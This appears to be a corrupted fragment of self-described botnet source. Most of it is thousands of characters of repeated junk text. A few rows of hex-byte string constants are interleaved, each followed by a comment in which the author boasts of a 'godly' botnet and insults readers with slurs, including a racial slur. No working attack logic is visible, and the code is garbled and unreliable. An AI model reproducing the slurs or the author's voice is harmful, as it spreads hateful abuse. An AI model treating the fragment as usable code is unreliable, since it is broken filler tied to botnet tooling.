ES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98